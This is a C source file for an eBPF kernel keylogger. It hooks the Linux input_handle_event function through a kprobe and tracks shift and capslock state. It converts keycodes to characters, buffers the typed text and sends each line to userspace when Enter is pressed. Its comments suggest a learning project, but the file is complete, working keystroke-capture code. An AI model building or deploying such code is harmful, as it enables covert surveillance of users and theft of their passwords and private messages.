// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "keylogger.h"


// ****************************************
// Data structures
// ****************************************

// Event state data structure
struct key_data {
    char buffer[BUFFER_SIZE];   // the circular buffer
    __u32 pos;  // curr position in buffer
    __u32 size; // curr size of buffer
    bool shift_pressed; // bool to track the state of the shift key
    bool capslock_on;   // bool to track capslock state
};

// Map to store the key state and buffer
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(struct key_data));
    __uint(max_entries, 1);
} key_data_map SEC(".maps");

// The perf buffer to send notifs to userspace
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
} perf_map SEC(".maps");


// ****************************************
// Helpers
// ****************************************

// function to add a char to the buffer
static inline void add_char(struct key_data *data, char c)
{
    // explicit bounds check - otherwise get error when loading eBPF prog
    if (data->pos >= BUFFER_SIZE)
        return;

    data->buffer[data->pos] = c;    // add the char to the buffer
    // update the position and size of the buffer
    data->pos = (data->pos + 1) % BUFFER_SIZE;
    if (data->size < BUFFER_SIZE) {
        data->size++;
    }
}

// function to remove the last char from the buffer
static inline void remove_last_char(struct key_data *data)
{
    if (data->size > 0) {
        if (data->pos != data->size) {  // buffer has wrapped: truncate the rest
            data->size = data->pos - 1;
        } else {
            data->size--;
        }

        if (data->pos == 0) {
            data->pos = BUFFER_SIZE - 1;
        } else {
            data->pos--;
        }
    }
}

// function to clear the buffer
static inline void clear_buffer(struct key_data *data)
{
    data->size = 0;
    data->pos = 0;
}

// function to convert to upper case
// @ https://www.ascii-code.com/
static inline char handle_uppercase(char c, bool shift_pressed, bool capslock_on)
{
    if ((shift_pressed && !capslock_on) || (!shift_pressed && capslock_on))
        return c - 32;  // in ASCII: diff |b| lower- and uppercase is 32
    return c;
}

// function to convert keycode to char
// @ https://github.com/torvalds/linux/blob/v6.8/include/uapi/linux/input-event-codes.h
static inline char keycode_to_char(unsigned int code, bool shift_pressed, bool capslock_on)
{
    // ==============================
    // Alphabetic characters (a-z)
    //  - orgnized as keyboard layers
    //  - qwerty convention as in `linux/input-event-codes.h`
    //      (use `sudo loadkeys us`)
    // ==============================
    // first layer
    if (code >= 16 && code <= 25) {  // q-p
        char base;
        switch (code - 16) {
            case 0: base = 'q'; break;
            case 1: base = 'w'; break;
            case 2: base = 'e'; break;
            case 3: base = 'r'; break;
            case 4: base = 't'; break;
            case 5: base = 'y'; break;
            case 6: base = 'u'; break;
            case 7: base = 'i'; break;
            case 8: base = 'o'; break;
            case 9: base = 'p'; break;
            default: return '\0';
        }
        return handle_uppercase(base, shift_pressed, capslock_on);
    }
    // second layer
    else if (code >= 30 && code <= 38) {  // a-l
        char base;
        switch (code - 30) {
            case 0: base = 'a'; break;
            case 1: base = 's'; break;
            case 2: base = 'd'; break;
            case 3: base = 'f'; break;
            case 4: base = 'g'; break;
            case 5: base = 'h'; break;
            case 6: base = 'j'; break;
            case 7: base = 'k'; break;
            case 8: base = 'l'; break;
            default: return '\0';
        }
        return handle_uppercase(base, shift_pressed, capslock_on);
    }
    // third layer
    else if (code >= 44 && code <= 50) {  // z-m
        char base;
        switch (code - 44) {
            case 0: base = 'z'; break;
            case 1: base = 'x'; break;
            case 2: base = 'c'; break;
            case 3: base = 'v'; break;
            case 4: base = 'b'; break;
            case 5: base = 'n'; break;
            case 6: base = 'm'; break;
            default: return '\0';
        }
        return handle_uppercase(base, shift_pressed, capslock_on);
    }

    // ==============================
    // Numeric keys (0-9)
    // ==============================
    else if (code >= 2 && code <= 11) {
        if (code == 11)  return '0'; // KEY_0
        else return '0' + (code - 1);  // KEY_1(2) through KEY_9(10)
    }

    // ==============================
    // Special chars
    // ==============================
    else if (code == 57) return ' ';// Space
    else if (code == 51) return ','; // Comma
    else if (code == 52) return '.'; // Dot
    else if (code == 12) return '-'; // Minus
    else if (code == 13) return '='; // Equal

    // ==============================
    // null for other keys
    // ==============================
    return '\0';
}


// ****************************************
// Hook
// ****************************************

SEC("kprobe/input_handle_event")
int BPF_KPROBE(input_handle_event, struct input_dev *dev, unsigned int type, unsigned int code, int value)
{
    // only interested in key events (defined `keylogger.h`)
    // @ https://www.kernel.org/doc/html/v4.17/input/event-codes.html#ev-key
    if (type != EV_KEY)
        return 0;

    // only interested in KEY_PRESS and KEY_RELEASE events (defined `keylogger.h`)
    // I think the previous if statement is sufficient for the sanity check but I'll keep that one just for additional safety
    if (value != KEY_PRESS && value != KEY_RELEASE)
        return 0;

    // rertrieve the buffer data
    __u32 key = 0;
    struct key_data *data = bpf_map_lookup_elem(&key_data_map, &key);
    if (!data)
        return 0;

    // handle key release events
    if (value == KEY_RELEASE) {
        if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
            data->shift_pressed = false;
        }
        return 0;
    }

    // handle key press events
    switch (code) {
        // update shift
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
            data->shift_pressed = true;
            break;

        // update capslock
        case KEY_CAPSLOCK:
            data->capslock_on = !data->capslock_on;
            break;

        // remove a char from buffer
        case KEY_BACKSPACE:
            remove_last_char(data);
            break;

        // clear the buffer
        case KEY_TAB:
            clear_buffer(data);
            break;

        // output to perf buffer in 3 phases:
        case KEY_ENTER: {
            // (a) init a new output structure for the perf buffer
            struct output_data output = {0};

            // (b) copy the content of the circular buffer into the output struct
            for (unsigned int i = 0; i < data->size && i < BUFFER_SIZE; i++) {
                output.message[i] = data->buffer[i];
            }
            // ensure null-termination
            // (ok to access output.message[32] as this buffer is 33 bytes -> see `keylogger.h` for the why)
            output.message[data->size < BUFFER_SIZE ? data->size : BUFFER_SIZE] = '\0';

            // (c) send to uspace
            bpf_perf_event_output(ctx, &perf_map, BPF_F_CURRENT_CPU, &output, sizeof(output));
            break;
        }

        // else deal with the keycode (convert to char and add it to buffer)
        default: {
            char c = keycode_to_char(code, data->shift_pressed, data->capslock_on);
            if (c != '\0') {
                add_char(data, c);
            }
            break;
        }
    }

    return 0;
}

char LICENSE[] SEC("license") = "Dual BSD/GPL";